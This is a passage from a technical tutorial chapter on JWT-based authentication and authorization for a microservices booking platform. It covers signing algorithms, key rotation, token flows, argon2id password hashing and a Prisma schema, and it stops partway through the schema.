# Chapter 9: Authentication & Authorization — The Bouncer

## Starting from What You Know

You have used `bcrypt` to hash passwords. Maybe you used `passport.js` with a `LocalStrategy` for form-based login. Your middleware probably looked something like this:

```typescript
// Your typical Express auth middleware
app.post('/login', async (req, res) => {
  const user = await db.findUserByEmail(req.body.email);
  const valid = await bcrypt.compare(req.body.password, user.passwordHash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  // Set a session cookie
  req.session.userId = user.id;
  res.json({ message: 'Logged in' });
});

// Protect routes
function authMiddleware(req, res, next) {
  if (!req.session.userId) return res.status(401).json({ error: 'Not logged in' });
  next();
}

app.get('/api/profile', authMiddleware, (req, res) => { /* ... */ });
```

This works in a monolith. The session lives in server memory (or Redis if you are using `connect-redis`). Every request carries a session cookie, the server looks up the session, and you know who the user is.

But in microservices, there is a fundamental problem: **sessions are server-specific**. If the user's login request hits Server A and creates a session, but their next request hits Server B (because the load balancer round-robins), Server B has no idea who they are. You could use sticky sessions (force users to always hit the same server), but that defeats the purpose of load balancing. You could store sessions in Redis (and we do use Redis for session storage), but now every single request to every single service must call Redis to look up the session. At 100,000 requests per minute, that is a lot of Redis round trips.

There is a better way: tokens that carry their own identity. That is JWT.

> **What If You Skip This?** Authentication is the front door of your entire system. Every vulnerability in this chapter -- weak hashing, insecure token storage, missing claims validation -- has been exploited in real breaches. Equifax, Uber, and T-Mobile all suffered from auth failures that exposed millions of records. At 100K bookings per minute, a single auth mistake can compromise thousands of credit cards in seconds.

---

## JWT in Depth — What Is Actually Inside That Token?

> **Key Term:** **JWT (JSON Web Token)** -- A compact, URL-safe token format that encodes a set of claims as a JSON object. The token is digitally signed so the recipient can verify that it was issued by a trusted party and has not been tampered with. JWTs are self-contained -- the server does not need to look up a database or call another service to validate the token, because the claims and signature are all inside the token itself.

A JWT is a string that looks like this:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0yMDI2LTAyIn0.
eyJ1c2VySWQiOiJVLTg4MSIsImVtYWlsIjoiamFuZUBleGFtcGxlLmNvbSIsInJv
bGVzIjpbInVzZXIiXSwicmVnaW9uIjoidXMtZWFzdC0xIiwic2Vzc2lvbklkIjoi
YTFiMmMzZDQiLCJpYXQiOjE3MDkxMjM0NTYsImV4cCI6MTcwOTEyNDM1NiwiYXVk
IjoiYm9va2luZy1hcGkiLCJpc3MiOiJib29raW5nLXBsYXRmb3JtIn0.SflKxwRJ
SMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Intimidating? It is not. That string has exactly three parts, separated by dots (`.`). Let us pull them apart.

### Part 1: The Header

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-02"
}
```

This is Base64URL-encoded (not encrypted -- just encoded, like translating English to Pig Latin). It tells you three things:

- **`alg`**: The signing algorithm. We will cover `HS256`, `RS256`, and `ES256` in depth shortly.
- **`typ`**: The type of token. Always `JWT`.
- **`kid`**: The Key ID. This tells the verifier *which* public key to use for signature validation. Critical for key rotation, which we cover below.

### Part 2: The Payload

```json
{
  "userId": "U-881",
  "email": "jane@example.com",
  "roles": ["user"],
  "region": "us-east-1",
  "sessionId": "a1b2c3d4",
  "iat": 1709123456,
  "exp": 1709124356,
  "aud": "booking-api",
  "iss": "booking-platform"
}
```

This is also Base64URL-encoded. It carries the **claims** -- pieces of information about the user and the token itself:

- **`userId`**: The user's unique identifier. Every service that receives this token knows who the request is from without calling the Auth Service again.
- **`email`**: The user's email. Useful for logging, personalization, or notification triggers.
- **`roles`**: An array of roles this user has. This drives authorization decisions (can this user access admin endpoints?).
- **`region`**: Which region this token was issued from. Helps with multi-region routing.
- **`sessionId`**: A unique ID for this login session. We store this in Redis so we can revoke the session (log the user out) without waiting for the token to expire.
- **`iat`** (Issued At): Unix timestamp when the token was created.
- **`exp`** (Expiration): Unix timestamp when the token expires. If `exp` is in the past, the token is rejected. No exceptions.
- **`aud`** (Audience): Who this token is intended for. If a token meant for `booking-api` shows up at `admin-api`, it should be rejected.
- **`iss`** (Issuer): Who created this token. Any token not issued by `booking-platform` is immediately suspicious.

> **Key Term:** **Claims** -- Key-value pairs inside a JWT payload that carry information about the user and the token. Standard claims (`iat`, `exp`, `iss`, `aud`, `sub`) are defined by the JWT specification (RFC 7519). Custom claims (`userId`, `roles`, `region`) are whatever your application needs.

**Critical point: the payload is NOT encrypted.** Anyone can decode a JWT payload -- it is just Base64. Go to [jwt.io](https://jwt.io), paste a token, and you will see the payload in plain text. Never put sensitive data in a JWT. No passwords, no credit card numbers, no social security numbers.

### Part 3: The Signature

The signature is the part that makes JWTs trustworthy. It is created by taking the encoded header, the encoded payload, and a secret (or private key), then running them through the algorithm specified in the header:

```
SIGNATURE = ALGORITHM(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_or_private_key
)
```

The signature guarantees two things:

1. **Integrity.** If anyone modifies the payload (changes `"roles": ["user"]` to `"roles": ["admin"]`), the signature will not match. The token is rejected instantly.
2. **Authenticity.** Only someone who knows the secret key (or holds the private key) can create a valid signature. If you receive a token with a valid signature, you know it was created by your Auth Service.

> **Analogy:** Think of a JWT like a government-issued ID card. The card has your photo and personal details printed on it (the payload -- visible to anyone who looks). On the back, there is a holographic seal embedded during manufacturing (the signature -- only the government can create it). A bouncer at a club can read your name and birthdate without calling the government (self-contained). If someone tries to alter the birthdate, the holographic seal will not match, and the bouncer rejects the ID. That is exactly how JWT verification works: the service checks the signature locally, without calling the Auth Service.

---

## JWT Signing Algorithms — RS256 vs HS256 vs ES256

This is where most JWT tutorials wave their hands and say "just use HS256." In a monolith, that advice is fine. In a microservices architecture handling 100K bookings per minute, algorithm choice has profound security and operational implications.

### HS256 — The Naive Approach

```
HMAC-SHA256(header + "." + payload, shared_secret)
```

HS256 is a **symmetric** algorithm. The same secret key both signs and verifies the token.

```typescript
// HS256: Same secret signs AND verifies
const secret = process.env.JWT_SECRET; // e.g., "super-secret-key-abc123"

// Auth Service signs the token
const token = jwt.sign(payload, secret, { algorithm: 'HS256' });

// Booking Service verifies the token -- uses the SAME secret
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
```

**Why it breaks at scale:** Every service that needs to verify tokens must possess the same secret. In our architecture, that means the Auth Service, Booking Service, Inventory Service, Payment Service, Search Service, and API Gateway all share one secret. If *any* of these services is compromised, the attacker can forge tokens for any user. A single leaked environment variable, a single misconfigured logging pipeline that dumps `process.env`, and your entire auth system is broken. The blast radius is your entire platform.

> **Common Mistake:** Using HS256 with the same secret across 15 microservices. When one junior developer accidentally commits `.env` to Git, every service is compromised. We have seen this happen at two different companies during security audits.

### RS256 — The Production Choice

```
RSA-SHA256(header + "." + payload, private_key)
```

RS256 is an **asymmetric** algorithm. A private key signs the token. A different public key verifies it.

```typescript
import * as fs from 'fs';

// Auth Service: has the PRIVATE key (kept secret)
const privateKey = fs.readFileSync('/secrets/jwt-private.pem');
const token = jwt.sign(payload, privateKey, {
  algorithm: 'RS256',
  keyid: 'key-2026-02'  // identifies which key pair was used
});

// Booking Service: has only the PUBLIC key (can be shared freely)
const publicKey = fs.readFileSync('/certs/jwt-public.pem');
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  issuer: 'booking-platform',
  audience: 'booking-api'
});
```

**Why this is correct:** Only the Auth Service holds the private key. If the Booking Service is compromised, the attacker gets the public key -- which is useless for forging tokens. They can *verify* tokens, but they cannot *create* new ones. The blast radius shrinks from "entire platform" to "one service." The Auth Service becomes the single, hardened point that must be protected.

```
  HS256 (Symmetric)              RS256 (Asymmetric)
  ┌─────────────┐                ┌──────────────┐
  │ Auth Service │               │ Auth Service  │
  │  secret_key  │◄─── same ───►│  PRIVATE key  │
  └──────┬───────┘               └──────┬────────┘
         │                              │ signs tokens
    shares key                          │
    with ALL                     ┌──────▼────────┐
    services                     │ PUBLIC key     │
         │                       │ (distributed   │
  ┌──────▼───────┐               │  to ALL        │
  │  Every       │               │  services)     │
  │  Service     │               └──┬──────┬──────┘
  │  can SIGN    │                  │      │
  │  AND verify  │                  ▼      ▼
  │  (DANGEROUS) │           ┌─────────┐ ┌─────────┐
  └──────────────┘           │Booking  │ │Payment  │
                             │can only │ │can only │
                             │VERIFY   │ │VERIFY   │
                             └─────────┘ └─────────┘
```

### ES256 — The Modern Alternative

```
ECDSA-SHA256(header + "." + payload, ec_private_key)
```

ES256 uses Elliptic Curve Digital Signature Algorithm (ECDSA). Like RS256, it is asymmetric (private key signs, public key verifies). The advantage is **smaller keys and signatures** with equivalent security.

| Property | HS256 | RS256 | ES256 |
|---|---|---|---|
| Type | Symmetric | Asymmetric | Asymmetric |
| Key for signing | Shared secret | RSA private key | EC private key |
| Key for verifying | Same shared secret | RSA public key | EC public key |
| Key size (equiv. 128-bit security) | 256-bit secret | 2048-bit RSA key | 256-bit EC key |
| Signature size | 32 bytes | 256 bytes | 64 bytes |
| Sign speed | Fastest | Slowest | Medium |
| Verify speed | Fastest | Medium | Slowest |
| Safe for microservices | No | Yes | Yes |
| Our recommendation | Dev/testing only | Production default | Mobile APIs, IoT |

> **Why Not HS256 in Production?** The convenience of a single shared secret becomes a liability with more than one service. Every service that can verify can also forge. In a zero-trust microservices architecture, no service should be able to impersonate the Auth Service.

### Generating RS256 Key Pairs

```bash
# Generate a 2048-bit RSA private key
openssl genrsa -out jwt-private.pem 2048

# Extract the public key from the private key
openssl rsa -in jwt-private.pem -pubout -out jwt-public.pem

# For ES256 (Elliptic Curve)
openssl ecparam -genkey -name prime256v1 -noout -out ec-private.pem
openssl ec -in ec-private.pem -pubout -out ec-public.pem
```

Store the private key in Kubernetes Secrets or HashiCorp Vault. Distribute the public key to all services -- it can even be served from a public URL.

---

## Key Rotation — Why Your Keys Must Have an Expiration Date

> **Key Term:** **Key Rotation** -- The practice of periodically replacing cryptographic keys with new ones. Old keys are phased out gracefully (they can still verify existing tokens but no longer sign new ones) and eventually retired entirely. This limits the damage window if a key is compromised and satisfies compliance requirements (PCI-DSS, SOC 2).

Imagine you discover that your JWT private key was accidentally included in a Docker image that was pushed to a public registry three months ago. With a single static key, every token ever issued by your system is now suspect. Without rotation, your only option is to invalidate ALL tokens at once -- logging out every single user simultaneously.

With key rotation, you maintain a **key set** (a JWKS -- JSON Web Key Set) and rotate keys on a schedule:

```typescript
// key-rotation.service.ts
import * as crypto from 'crypto';

interface KeyPair {
  kid: string;            // Key ID: "key-2026-02"
  privateKey: string;     // PEM-encoded RSA private key
  publicKey: string;      // PEM-encoded RSA public key
  createdAt: Date;
  expiresAt: Date;        // Stop SIGNING with this key after this date
  retiredAt: Date | null; // Stop VERIFYING with this key after this date
}

export class KeyRotationService {
  // Active keys: the system may have 2-3 keys active simultaneously
  // - Current key: used for signing new tokens
  // - Previous key(s): still used for verifying tokens issued before rotation
  private keys: Map<string, KeyPair> = new Map();

  async rotateKeys(): Promise<void> {
    // Step 1: Generate new key pair
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    const newKid = `key-${new Date().toISOString().slice(0, 7)}`;  // e.g., "key-2026-02"
    const now = new Date();

    const newKeyPair: KeyPair = {
      kid: newKid,
      privateKey,
      publicKey,
      createdAt: now,
      expiresAt: new Date(now.getTime() + 90 * 24 * 60 * 60 * 1000), // 90 days
      retiredAt: null
    };

    // Step 2: Store new key (in Vault or encrypted storage)
    await this.storeKey(newKeyPair);

    // Step 3: Mark old signing key as "verify-only"
    const currentSigningKey = this.getCurrentSigningKey();
    if (currentSigningKey) {
      // Old key can still VERIFY for 24 hours (to cover in-flight tokens)
      currentSigningKey.retiredAt = new Date(
        now.getTime() + 24 * 60 * 60 * 1000
      );
      await this.storeKey(currentSigningKey);
    }

    // Step 4: Publish the updated JWKS to the public endpoint
    await this.publishJWKS();
  }

  getCurrentSigningKey(): KeyPair | undefined {
    // Return the newest non-expired key
    return Array.from(this.keys.values())
      .filter(k => k.expiresAt > new Date() && k.retiredAt === null)
      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())[0];
  }

  getVerificationKey(kid: string): KeyPair | undefined {
    // Can verify with any key that hasn't been fully retired
    const key = this.keys.get(kid);
    if (!key) return undefined;
    if (key.retiredAt && key.retiredAt < new Date()) return undefined;
    return key;
  }

  // Serve public keys at GET /.well-known/jwks.json
  async publishJWKS(): Promise<JWKS> {
    const activeKeys = Array.from(this.keys.values())
      .filter(k => !k.retiredAt || k.retiredAt > new Date());

    return {
      keys: activeKeys.map(k => ({
        kty: 'RSA',
        kid: k.kid,
        use: 'sig',
        alg: 'RS256',
        n: extractModulus(k.publicKey),   // RSA modulus
        e: extractExponent(k.publicKey)   // RSA exponent
      }))
    };
  }

  private async storeKey(key: KeyPair): Promise<void> {
    this.keys.set(key.kid, key);
    // In production: store in HashiCorp Vault or AWS KMS
    // await vault.write(`secret/jwt-keys/${key.kid}`, key);
  }
}
```

The rotation flow works like this:

```
Timeline:
────────────────────────────────────────────────────►

Day 1                Day 90              Day 91
│                    │                   │
▼                    ▼                   ▼
Key A created        Key B created       Key A retired
(signs + verifies)   (signs + verifies)  (no longer verifies)
                     Key A still
                     verifies only

Tokens signed by A         Tokens signed by A
are still valid  ──────►   are NOW invalid
during overlap             (they've expired
window                     by now anyway--
                           max lifetime < 90 days)
```

> **Checkpoint:** Can you explain why a 90-day key rotation schedule works with 15-minute access tokens and 7-day refresh tokens? Hint: after 90 days, no valid token signed by the old key can still exist.

---

## Access Tokens vs. Refresh Tokens — Why Two Tokens?

Here is a dilemma. You want your JWTs to last a long time so users do not have to log in constantly. But you also want them to expire quickly so that if a token is stolen, the attacker has a limited window. You cannot have both... unless you use two tokens.

**Access Token**: Short-lived (15 minutes in our system). This is the token that goes in the `Authorization` header of every API request. If it is stolen, the attacker has at most 15 minutes before it expires and becomes useless.

**Refresh Token**: Long-lived (7 days in our system). This token is stored securely (in an HTTP-only cookie) and is *only* used to get a new access token when the old one expires. It never goes in API request headers.

> **Key Term:** **Refresh Token** -- A long-lived credential used solely to obtain new access tokens. It never accompanies regular API requests, reducing its exposure to interception. If compromised, it can be revoked server-side by deleting its session from Redis.

Why not just make the access token last 7 days? Because access tokens travel with *every request*. They are in HTTP headers. They are in server logs. They are in debugging tools. The more they travel, the more likely they are to leak. A 15-minute window limits the damage of a leak.

---

## The Full Authentication Flow — ASCII Diagrams

Let us trace every auth flow with precise diagrams. These are the flows your system must implement.

### Flow 1: Login

```
  Browser                    API Gateway              Auth Service              Database         Redis
    │                            │                         │                       │               │
    │  POST /auth/login          │                         │                       │               │
    │  {email, password}         │                         │                       │               │
    │───────────────────────────►│                         │                       │               │
    │                            │  Forward to Auth        │                       │               │
    │                            │────────────────────────►│                       │               │
    │                            │                         │  SELECT * FROM users  │               │
    │                            │                         │  WHERE email = ?      │               │
    │                            │                         │──────────────────────►│               │
    │                            │                         │  {id, email,          │               │
    │                            │                         │   password_hash,      │               │
    │                            │                         │   roles}              │               │
    │                            │                         │◄──────────────────────│               │
    │                            │                         │                       │               │
    │                            │                         │  bcrypt.compare(      │               │
    │                            │                         │    password,          │               │
    │                            │                         │    password_hash)     │               │
    │                            │                         │  ✓ Match              │               │
    │                            │                         │                       │               │
    │                            │                         │  Sign access_token    │               │
    │                            │                         │  (RS256, 15 min)      │               │
    │                            │                         │                       │               │
    │                            │                         │  Sign refresh_token   │               │
    │                            │                         │  (RS256, 7 days)      │               │
    │                            │                         │                       │               │
    │                            │                         │  SETEX session:<sid>  │               │
    │                            │                         │  604800               │               │
    │                            │                         │──────────────────────────────────────►│
    │                            │                         │              OK       │               │
    │                            │                         │◄──────────────────────────────────────│
    │                            │                         │                       │               │
    │                            │  {access_token}         │                       │               │
    │                            │  Set-Cookie:            │                       │               │
    │                            │   refresh_token=...;    │                       │               │
    │                            │   HttpOnly; Secure;     │                       │               │
    │                            │   SameSite=Strict       │                       │               │
    │◄───────────────────────────│◄────────────────────────│                       │               │
    │                            │                         │                       │               │
```

### Flow 2: Token Refresh

```
  Browser                    API Gateway              Auth Service              Database         Redis
    │                            │                         │                       │               │
    │  POST /auth/refresh        │                         │                       │               │
    │  Cookie: refresh_token=... │                         │                       │               │
    │───────────────────────────►│                         │                       │               │
    │                            │────────────────────────►│                       │               │
    │                            │                         │  jwt.verify(          │               │
    │                            │                         │    refresh_token,     │               │
    │                            │                         │    public_key)        │               │
    │                            │                         │  ✓ Valid signature    │               │
    │                            │                         │                       │               │
    │                            │                         │  GET session:<sid>    │               │
    │                            │                         │──────────────────────────────────────►│
    │                            │                         │  {userId, createdAt}  │               │
    │                            │                         │◄──────────────────────────────────────│
    │                            │                         │  ✓ Session exists     │               │
    │                            │                         │                       │               │
    │                            │                         │  SELECT roles FROM    │               │
    │                            │                         │  users WHERE id = ?   │               │
    │                            │                         │──────────────────────►│               │
    │                            │                         │  {roles: ["user",     │               │
    │                            │                         │   "premium"]}         │               │
    │                            │                         │◄──────────────────────│               │
    │                            │                         │                       │               │
    │                            │                         │  Sign NEW             │               │
    │                            │                         │  access_token         │               │
    │                            │                         │  (with CURRENT roles) │               │
    │                            │                         │                       │               │
    │  {new_access_token}        │                         │                       │               │
    │◄───────────────────────────│◄────────────────────────│                       │               │
    │                            │                         │                       │               │
```

Notice step 3 carefully: when the access token expires and the client uses the refresh token to get a new one, the Auth Service reads the user's **current** roles from the database -- not from the old token. This is how permission changes propagate. If an admin revoked the user's `premium` role 10 minutes ago, the new access token will reflect that change.

### Flow 3: Logout

```
  Browser                    API Gateway              Auth Service              Redis
    │                            │                         │                       │
    │  POST /auth/logout         │                         │                       │
    │  Cookie: refresh_token=... │                         │                       │
    │  Authorization: Bearer ... │                         │                       │
    │───────────────────────────►│                         │                       │
    │                            │────────────────────────►│                       │
    │                            │                         │  Extract sessionId    │
    │                            │                         │  from refresh_token   │
    │                            │                         │                       │
    │                            │                         │  DEL session:<sid>    │
    │                            │                         │──────────────────────►│
    │                            │                         │  (1) deleted          │
    │                            │                         │◄──────────────────────│
    │                            │                         │                       │
    │  Set-Cookie:               │                         │                       │
    │   refresh_token=;          │                         │                       │
    │   Max-Age=0                │                         │                       │
    │  {message: "Logged out"}   │                         │                       │
    │◄───────────────────────────│◄────────────────────────│                       │
    │                            │                         │                       │
    │  NOTE: The old access      │                         │                       │
    │  token is still            │                         │                       │
    │  cryptographically valid   │                         │                       │
    │  for up to 15 min, BUT     │                         │                       │
    │  the Redis session check   │                         │                       │
    │  will reject it.           │                         │                       │
```

---

## The Token Service — Implementation Deep Dive

Now let us look at the actual implementation using RS256, key rotation, and all the patterns we have discussed.

```typescript
// auth.service.ts
import * as jwt from 'jsonwebtoken';
import * as fs from 'fs';
import { randomUUID } from 'crypto';

interface TokenPayload {
  userId: string;       // String to avoid BigInt JSON serialization issues
  email: string;
  roles: string[];
  region: string;
  sessionId: string;
}

interface TokenPair {
  accessToken: string;
  refreshToken: string;
}

export class AuthService {
  private readonly privateKey: string;
  private readonly publicKey: string;
  private readonly currentKid: string;

  constructor(
    private readonly redis: RedisClient,
    private readonly keyRotationService: KeyRotationService
  ) {
    // Load keys from mounted Kubernetes secrets or Vault
    const signingKey = this.keyRotationService.getCurrentSigningKey();
    this.privateKey = signingKey.privateKey;
    this.publicKey = signingKey.publicKey;
    this.currentKid = signingKey.kid;
  }

  async generateTokenPair(user: User): Promise<TokenPair> {
    const payload: TokenPayload = {
      userId: user.id.toString(),
      email: user.email,
      roles: user.roles,
      region: process.env.REGION || 'us-east-1',
      sessionId: randomUUID()
    };

    // Sign access token with RS256 private key
    const accessToken = jwt.sign(payload, this.privateKey, {
      algorithm: 'RS256',
      expiresIn: '15m',
      issuer: 'booking-platform',
      audience: 'booking-api',
      keyid: this.currentKid       // Include kid in header for key rotation
    });

    // Sign refresh token -- minimal payload, same private key
    const refreshToken = jwt.sign(
      { userId: payload.userId, sessionId: payload.sessionId },
      this.privateKey,
      {
        algorithm: 'RS256',
        expiresIn: '7d',
        issuer: 'booking-platform',
        keyid: this.currentKid
      }
    );

    // Store session in Redis for revocation support
    await this.redis.setex(
      `session:${payload.sessionId}`,
      7 * 24 * 60 * 60,             // TTL: 7 days in seconds (604,800)
      JSON.stringify({
        userId: payload.userId,
        roles: user.roles,
        createdAt: Date.now(),
        ip: '',                      // Populated by caller
        userAgent: ''                // Populated by caller
      })
    );

    return { accessToken, refreshToken };
  }

  async verifyAccessToken(token: string): Promise<TokenPayload> {
    // Step 1: Decode header to get kid (without verifying yet)
    const decoded = jwt.decode(token, { complete: true });
    if (!decoded || !decoded.header.kid) {
      throw new UnauthorizedError('Invalid token format');
    }

    // Step 2: Look up the correct public key for this kid
    const keyPair = this.keyRotationService.getVerificationKey(decoded.header.kid);
    if (!keyPair) {
      throw new UnauthorizedError('Unknown or retired signing key');
    }

    // Step 3: Verify signature, expiration, issuer, audience
    const payload = jwt.verify(token, keyPair.publicKey, {
      algorithms: ['RS256'],       // ONLY accept RS256 -- block "none" attack
      issuer: 'booking-platform',
      audience: 'booking-api'
    }) as TokenPayload;

    // Step 4: Check if the session has been revoked in Redis
    const session = await this.redis.get(`session:${payload.sessionId}`);
    if (!session) {
      throw new UnauthorizedError('Session has been revoked');
    }

    return payload;
  }

  async logout(refreshToken: string): Promise<void> {
    const decoded = jwt.decode(refreshToken) as { sessionId: string };
    if (decoded?.sessionId) {
      await this.redis.del(`session:${decoded.sessionId}`);
    }
  }
}
```

Let us walk through the critical design decisions.

**Why RS256 instead of HS256?** Only the Auth Service holds the private key. Every other service gets the public key (via JWKS endpoint or mounted config). If any downstream service is compromised, the attacker cannot forge tokens.

**Why `algorithms: ['RS256']` in `jwt.verify`?** This is a security-critical safeguard against the **"none" algorithm attack** (covered in the vulnerabilities section). If you pass `algorithms: undefined`, the `jsonwebtoken` library will accept whatever algorithm the token's header claims -- including `"alg": "none"`, which means no signature at all. Always whitelist the exact algorithms you expect.

**Why `kid` in the header?** During key rotation, you may have two active key pairs. The `kid` tells the verifier which public key to use. Without it, the verifier would have to try every public key until one works -- wasteful and error-prone.

**Why store session metadata (IP, userAgent)?** For security auditing. If a session is used from a new IP address or a different user agent, your system can flag it for additional verification or force re-authentication.

> **What If You Skip This?** If you skip session storage in Redis, you have no way to revoke tokens. A user's account gets compromised, and you tell them "sorry, we cannot log you out -- just wait 15 minutes." For a financial platform handling hotel bookings and credit card charges, that is unacceptable.

---

## Password Hashing Deep-Dive — bcrypt vs argon2 vs scrypt

Before we store a single user, we must answer: how do you hash their password? This is not a trivial question. The wrong choice can mean the difference between "attacker spends 10,000 years cracking passwords" and "attacker cracks all passwords over a weekend."

### The Naive Approach: SHA-256

```typescript
// NEVER DO THIS
import { createHash } from 'crypto';
const hash = createHash('sha256').update(password).digest('hex');
```

SHA-256 is a general-purpose hash. It is designed to be **fast**. A modern GPU can compute billions of SHA-256 hashes per second. An attacker with a stolen database can brute-force every 8-character password in hours. Speed is the enemy of password security.

### Why It Breaks: You Need Slowness

Password hashing algorithms are intentionally designed to be **slow** and **memory-intensive**. They have a configurable "cost factor" that makes each hash computation take a deliberate amount of time (typically 100-500ms). This makes brute-force attacks economically impractical.

### The Correct Approach: Three Real Options

| Property | bcrypt | scrypt | argon2id |
|---|---|---|---|
| Year introduced | 1999 | 2009 | 2015 (won PHC) |
| Tuneable parameters | Cost factor (rounds) | CPU cost, memory cost, parallelism | Time cost, memory cost, parallelism |
| Memory-hard | No (fixed 4KB) | Yes | Yes |
| GPU-resistant | Moderate | Strong | Strongest |
| OWASP recommended | Yes (legacy) | Yes | Yes (preferred) |
| Our choice | -- | -- | argon2id |

**bcrypt** has been the industry standard for 25 years. It works. But it uses only 4KB of memory, which means GPU-based attacks are becoming increasingly feasible as GPUs get more memory bandwidth. It is still safe *today* with a cost factor of 12+, but it is reaching the end of its useful life.

**scrypt** added memory-hardness: each hash computation requires a configurable amount of RAM, making GPU attacks much more expensive (GPUs have fast compute but limited memory per core). However, scrypt's parameter tuning is complex, and it was not specifically designed for password hashing.

**argon2id** won the 2015 Password Hashing Competition (PHC). It combines the best properties: configurable time cost, configurable memory cost, and configurable parallelism. The `id` variant is a hybrid that resists both side-channel attacks (from argon2i) and GPU attacks (from argon2d).

```typescript
// password-hashing.service.ts
import * as argon2 from 'argon2';

export class PasswordService {
  // OWASP-recommended parameters for argon2id (2024)
  private readonly hashOptions: argon2.Options = {
    type: argon2.argon2id,     // Hybrid mode: resists GPU + side-channel
    memoryCost: 65536,         // 64 MB of RAM per hash
    timeCost: 3,               // 3 iterations
    parallelism: 4,            // 4 parallel threads
    hashLength: 32,            // 256-bit output
    saltLength: 16             // 128-bit random salt (auto-generated)
  };

  async hashPassword(plaintext: string): Promise<string> {
    // argon2 auto-generates a cryptographic random salt
    // Output format: $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>
    return argon2.hash(plaintext, this.hashOptions);
  }

  async verifyPassword(plaintext: string, storedHash: string): Promise<boolean> {
    try {
      return await argon2.verify(storedHash, plaintext);
    } catch {
      // Invalid hash format, corrupted data, etc.
      return false;
    }
  }

  async needsRehash(storedHash: string): Promise<boolean> {
    // Returns true if the hash was created with weaker parameters
    // (e.g., after upgrading from memoryCost=32768 to 65536)
    return argon2.needsRehash(storedHash, this.hashOptions);
  }
}

// Usage during login -- transparent rehashing
async function login(email: string, password: string): Promise<TokenPair> {
  const user = await prisma.user.findUnique({ where: { email } });
  if (!user) throw new UnauthorizedError('Invalid credentials');

  const valid = await passwordService.verifyPassword(password, user.passwordHash);
  if (!valid) throw new UnauthorizedError('Invalid credentials');

  // Transparent rehash: if hash parameters have been upgraded, rehash on login
  if (await passwordService.needsRehash(user.passwordHash)) {
    const newHash = await passwordService.hashPassword(password);
    await prisma.user.update({
      where: { id: user.id },
      data: { passwordHash: newHash }
    });
  }

  return authService.generateTokenPair(user);
}
```

> **Why Not bcrypt?** bcrypt is not *wrong* -- it is battle-tested and still OWASP-approved. But argon2id is objectively superior: it is memory-hard (making GPU attacks 1000x more expensive), it has more tuning parameters, and it won the academic competition specifically designed to find bcrypt's successor. For a new system in 2026, there is no reason to choose bcrypt over argon2id. If you are migrating an existing system, use the `needsRehash` pattern shown above to transparently upgrade hashes during login.

> **Common Mistake:** Setting argon2 memory cost too low. With `memoryCost: 1024` (1 MB), you lose the GPU-resistance advantage entirely. The OWASP minimum recommendation is 19 MiB for argon2id. We use 64 MiB because our Auth Service has dedicated memory for this purpose.

---

## Prisma Models — Users, Roles, Permissions, Sessions

Every auth system needs a data model. Here is our complete Prisma schema for auth, followed by the equivalent raw SQL for teams that prefer direct database management.

### Prisma Schema

```prisma
// prisma/schema.prisma

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "mysql"
  url      = env("DATABASE_URL")
}

model User {
  id            BigInt    @id @default(autoincrement())
  email         String    @unique @db.VarChar(255)
  passwordHash  String    @map("password_hash") @db.VarChar(255)
  firstName     String    @map("first_name") @db.VarChar(100)
  lastName      String    @map("last_name") @db.VarChar(100)
  phone         String?   @db.VarChar(20)
  isActive      Boolean   @default(true) @map("is_active")
  emailVerified Boolean   @default(false) @map("email_verified")
  mfaEnabled    Boolean   @default(false) @map("mfa_enabled")
  mfaSecret     String?   @map("mfa_secret") @db.VarChar(255)
  failedLogins  Int       @default(0) @map("failed_login_attempts")
  lockedUntil   DateTime? @map("locked_until")
  lastLoginAt   DateTime? @map("last_login_at")
  createdAt     DateTime  @default(now()) @map("created_at")
  updatedAt     DateTime  @updatedAt @map("updated_at")

  // Relations
  userRoles     UserRole[]
  sessions      Session[]
  apiKeys       ApiKey[]
  auditLogs     AuditLog[]

  @@map("users")
  @@index([email])
  @@index([isActive])
}

model Role {
  id          Int       @id @default(autoincrement())
  name        String    @unique @db.VarChar(50)     // 'user', 'admin', 'super_admin'
  description String?   @db.VarChar(255)
  isSystem    Boolean   @default(false) @map("is_system")  // Cannot be deleted
  createdAt   DateTime  @default(now()) @map("created_at")

  // Relations
  userRoles       UserRole[]
  rolePermissions RolePermission[]

  @@map("roles")
}

model Permission {
  id          Int       @id @default(autoincrement())
  resource    String    @db.VarChar(100)   // 'bookings', 'reports', 'users'
  action      String    @db.VarChar(50)    // 'create', 'read', 'update', 'delete'
  description String?   @db.VarChar(255)
  createdAt   DateTime  @default(now()) @map("created_at")

  // Relations
  rolePermissions RolePermission[]

  @@unique([resource, action])
  @@map("permissions")
}

model UserRole {
  id        Int      @id @default(autoincrement())
  userId    BigInt   @map("user_id")
  roleId    Int      @map("role_id")
  grantedBy BigInt?  @map("granted_by")    // Which admin granted this role
  grantedAt DateTime @default(now()) @map("granted_at")
  expiresAt DateTime? @map("expires_at")   // Temporary role assignments

  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
  role      Role     @relation(fields: [roleId], references: [id], onDelete: Cascade)

  @@unique([userId, roleId])
  @@map("user_roles")
  @@index([userId])
  @@index([roleId])
}

model RolePermission {
  id           Int      @id @default(autoincrement())
  roleId       Int      @map("role_id")
  permissionId Int      @map("permission_id")
  conditions   Json?    // ABAC-style conditions: {"region": "us-east-1"}

  role         Role       @relation(fields: [roleId], references: [id], onDelete: Cascade)
  permission   Permission @relation(fields: [permissionId], references: [id], onDelete: Cascade)

  @@unique([roleId, permissionId])
  @@map("role_permissions")
}

model Session {
  id          String    @id @default(uuid()) @db.VarChar(36)
  userId      BigInt    @map("user_id")
  ipAddress   String    @map("ip_address") @db.VarChar(45)    // IPv6-compatible
  userAgent   String    @map("user_agent") @db.VarChar(500)
  deviceId    String?   @map("device_id") @db.VarChar(255)
  isActive    Boolean   @default(true) @map("is_active")
  lastUsedAt  DateTime  @default(now()) @map("last_used_at")
